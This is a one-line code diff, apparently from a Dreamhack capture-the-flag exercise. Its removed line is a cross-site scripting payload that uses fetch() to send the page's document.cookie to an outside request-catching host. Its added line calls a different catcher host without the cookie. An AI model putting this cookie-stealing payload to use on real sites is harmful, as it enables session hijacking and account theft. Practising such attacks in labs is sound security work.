@@ -1,1 +1,1 @@
-fetch("https://opvtxpc.request.dreamhack.games/user?cookie"+document.cookie);
+fetch("https://xwpysvp.request.dreamhack.games/user");
